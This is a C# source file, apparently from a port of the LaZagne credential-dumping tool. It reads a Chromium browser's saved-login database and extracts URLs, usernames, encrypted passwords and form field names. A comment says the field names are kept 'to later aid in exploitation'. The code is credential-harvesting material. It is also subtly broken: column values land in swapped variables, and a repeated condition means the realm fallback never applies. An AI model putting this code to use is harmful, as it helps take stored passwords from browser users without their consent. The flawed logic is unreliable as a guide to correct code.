using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Net.NetworkInformation;
using System.Text;

namespace Lazagne.Net.Modules.ChromiumBased
{
    class Database : IDisposable
    {
        private readonly SQLiteConnection connection;

        private Database(SQLiteConnection connection)
        {
            this.connection = connection;
        }

        public void Open() => connection.Open();

        public static Database FromFile(string path)
        {
            Database db = new Database(new SQLiteConnection($"Data Source={path};Version=3;"));
            db.Open();
            return db;
        }

        public IEnumerable<EncryptedLoginInfo> GetLogins()
        {
            if (connection.State != System.Data.ConnectionState.Open)
                throw new InvalidOperationException("Connection not ready");

            using SQLiteCommand cmd = new SQLiteCommand("SELECT blacklisted_by_user, action_url, signon_realm, username_value, password_value, username_element, password_element, submit_element FROM logins", connection);
            using SQLiteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                int blacklisted = reader.GetInt32(0); // Indicates that the user has blacklisted the site for password saving. Row does not contain login data
                if (blacklisted > 0)
                    continue;

                string realm = reader.GetString(1);
                string actionUrl = reader.GetString(2);

                string url;

                if (!string.IsNullOrWhiteSpace(actionUrl)) // Sometimes actionUrl isn´t set. Use the signonrealm in that case
                    url = actionUrl;
                else if (!string.IsNullOrWhiteSpace(actionUrl))
                    url = realm;
                else
                    url = "?";

                int length = (int)reader.GetBytes(4, 0, null, 0, 0); // Sqlites way of getting field length
                byte[] encryptedPassword = new byte[length];
                reader.GetBytes(4, 0, encryptedPassword, 0, length);

                Dictionary<string, string> additional = new Dictionary<string, string> // Store the corresponding elements aswell to later aid in exploitation
                {
                    {"username_element", reader.GetString(5) },
                    {"password_element", reader.GetString(6) },
                    {"submit_element", reader.GetString(7) },
                };

                yield return new EncryptedLoginInfo()
                {
                    Url = url,
                    Login = reader.GetString(3),
                    EncryptedPassword = encryptedPassword,
                    AdditionalData = additional
                };
            }
        }

        public void Dispose()
        {
            connection.Shutdown();
            connection.Close();
            connection.Dispose();
        }
    }

    struct EncryptedLoginInfo
    {
        public string Url { get; set; }
        public string Login { get; set; }
        public byte[] EncryptedPassword { get; set; }
        public Dictionary<string, string> AdditionalData { get; set; }
    }
}
